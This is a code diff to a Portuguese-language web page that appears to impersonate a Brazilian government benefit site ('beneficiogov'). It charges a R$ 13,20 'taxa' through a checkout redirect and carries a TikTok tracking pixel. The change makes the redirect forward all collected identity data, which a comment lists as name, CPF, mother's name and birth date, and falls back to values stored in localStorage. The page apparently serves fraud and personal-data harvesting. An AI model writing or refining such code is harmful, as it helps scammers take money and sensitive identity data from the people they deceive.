@@ -7,7 +7,6 @@
 var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
 ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
 
-
   ttq.load('D6ROQ3BC77UA8MCFBSDG');
   ttq.page();
 }(window, document, 'ttq');
@@ -31,60 +30,41 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     <link rel="stylesheet" href="css/Ly8MoZSiaXHt.css">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
 
-    <!-- Função definida antes de qualquer script externo -->
     <script>
         function irParaCheckout() {
-            var p = new URLSearchParams(window.location.search);
+            var p    = new URLSearchParams(window.location.search);
             var dest = new URLSearchParams();
 
-            // Pega nome e CPF da URL
-            var nome = p.get('nome') || p.get('name') || '';
-            var cpf  = p.get('cpf') || p.get('documento') || '';
-
-            // Fallback: tenta localStorage
-            if (!nome || !cpf) {
-                try {
-                    var lsRaw = localStorage.getItem('urlParams');
-                    if (lsRaw) {
-                        var ls = JSON.parse(lsRaw);
-                        nome = nome || ls['nome'] || ls['name'] || '';
-                        cpf  = cpf  || ls['cpf']  || ls['documento'] || '';
-                    }
-                } catch(e) {}
-            }
-            if (!nome || !cpf) {
-                try {
-                    var udRaw = localStorage.getItem('userData');
-                    if (udRaw) {
-                        var ud = JSON.parse(udRaw);
-                        nome = nome || ud['nome'] || ud['name'] || '';
-                        cpf  = cpf  || ud['cpf']  || ud['documento'] || '';
-                    }
-                } catch(e) {}
-            }
-
-            if (nome) dest.set('nome', nome);
-            if (cpf)  dest.set('documento', cpf.replace(/\D/g, ''));
-
-            // Valor desta taxa (R$ 13,20 = 1320 centavos)
-            dest.set('valor', '1320');
-
-            // Passa todos os UTMs
-            ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
-                var v = p.get(k);
-                if (v) dest.set(k, v);
+            // Repassa TODOS os parâmetros recebidos (nome, cpf, mae, nascimento, utms, etc.)
+            p.forEach(function(value, key) {
+                if (key !== 'valor') dest.set(key, value);
             });
 
-            // Fallback UTMs do localStorage
-            try {
-                var lsRaw2 = localStorage.getItem('urlParams');
-                if (lsRaw2) {
-                    var ls2 = JSON.parse(lsRaw2);
-                    ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
-                        if (!dest.get(k) && ls2[k]) dest.set(k, ls2[k]);
-                    });
-                }
-            } catch(e) {}
+            // Garante nome e cpf (fallback localStorage)
+            var nome = dest.get('nome') || dest.get('name') || '';
+            var cpf  = dest.get('cpf')  || dest.get('documento') || '';
+
+            if (!nome || !cpf) {
+                try {
+                    var ls = JSON.parse(localStorage.getItem('urlParams') || '{}');
+                    if (!nome) { nome = ls['nome'] || ls['name'] || ''; if (nome) dest.set('nome', nome); }
+                    if (!cpf)  { cpf  = ls['cpf']  || ls['documento'] || ''; if (cpf) dest.set('documento', cpf.replace(/\D/g,'')); }
+                } catch(e) {}
+            }
+            if (!nome || !cpf) {
+                try {
+                    var ud = JSON.parse(localStorage.getItem('userData') || '{}');
+                    if (!nome) { nome = ud['nome'] || ud['name'] || ''; if (nome) dest.set('nome', nome); }
+                    if (!cpf)  { cpf  = ud['cpf']  || ud['documento'] || ''; if (cpf) dest.set('documento', cpf.replace(/\D/g,'')); }
+                } catch(e) {}
+            }
+
+            // Garante que cpf está em documento também
+            if (dest.get('cpf') && !dest.get('documento')) dest.set('documento', dest.get('cpf').replace(/\D/g,''));
+            if (dest.get('documento')) dest.set('documento', dest.get('documento').replace(/\D/g,''));
+
+            // Valor fixo desta etapa (R$ 13,20 = 1320 centavos)
+            dest.set('valor', '1320');
 
             var url = 'https://beneficiogov.vercel.app/checkout2.html?' + dest.toString();
             console.log('Redirecionando para:', url);
@@ -219,7 +199,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         </div>
     </div>
 
-    <!-- Botão corrigido -->
     <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
         <button class="styled-button2" onclick="irParaCheckout()">
             <span class="button-text">
@@ -235,24 +214,16 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     <script src="js/8fmLxVqBPGdA.js"></script>
     <script src="js/8Eu6kEbwRuNP.js" data-utmify-prevent-subids="" async="" defer=""></script>
 
-    <!-- Garante o onclick mesmo após scripts externos rodarem -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             var btn = document.querySelector('#finalButton .styled-button2');
             if (btn) {
-                btn.onclick = function(e) {
-                    e.preventDefault();
-                    irParaCheckout();
-                };
+                btn.onclick = function(e) { e.preventDefault(); irParaCheckout(); };
             }
-            // Observer para caso o botão apareça depois (animação/show)
             var observer = new MutationObserver(function() {
                 var btn2 = document.querySelector('#finalButton .styled-button2');
                 if (btn2) {
-                    btn2.onclick = function(e) {
-                        e.preventDefault();
-                        irParaCheckout();
-                    };
+                    btn2.onclick = function(e) { e.preventDefault(); irParaCheckout(); };
                 }
             });
             observer.observe(document.body, { childList: true, subtree: true, attributes: true });
